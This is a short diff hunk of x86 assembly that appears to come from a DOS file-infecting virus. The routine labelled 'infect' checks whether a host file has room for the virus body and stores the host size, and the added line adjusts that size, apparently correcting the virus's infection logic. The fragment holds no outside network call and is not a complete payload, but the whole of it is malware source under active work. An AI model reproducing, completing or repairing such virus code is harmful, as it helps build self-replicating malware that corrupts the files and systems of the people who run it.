@@ -189,6 +189,7 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      pop bx
      cmp ax, 65436-virus_size   ; Is the file too big??
      jae short infect.abort_infection_bridge
+     sub ax, 3
      mov [data_section.host_size+bp], ax
      push bx          ; Nope, perfetto sizo. BX = File handle
 
